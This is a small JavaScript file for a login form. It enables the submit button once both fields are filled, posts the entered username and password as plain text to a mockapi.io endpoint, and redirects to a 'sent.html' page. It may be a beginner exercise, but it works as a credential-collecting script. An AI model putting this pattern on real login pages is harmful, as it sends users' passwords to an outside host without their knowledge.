
setInterval(() => {
    let field1 = document.getElementById("name")
    let field2 = document.getElementById("password");
    
    if ((field1.value === "" || field1.value === " ") || (field2.value === "" || field2.value === " ")) {
        document.getElementById("btn").style.backgroundColor = "rgb(204, 199, 199)"
        document.getElementById("btn").style.border = "solid rgb(204, 199, 199)"
    }else {
        document.getElementById("btn").style.backgroundColor = "greenyellow"
        document.getElementById("btn").style.border = "solid greenyellow"
    }
}, 100);


const url = "https://67648aec52b2a7619f5ce1fe.mockapi.io/login"; // MockAPI URL

async function sendData(data) {

  const response = await fetch(url, {
    method: "POST", // HTTP method
    headers: {
      "Content-Type": "application/json", // Tell the server you're sending JSON
    },
    body: JSON.stringify(data), // Data you want to send
  });

  const result = await response.json();
  console.log("Data sent:", result);
}

// Send some data
function send() {
    sendData({ message: `${document.getElementById("name").value} , ${document.getElementById("password").value}` });
    setTimeout(() => {
        window.location.href = "./sent.html"
    }, 800);
   
}
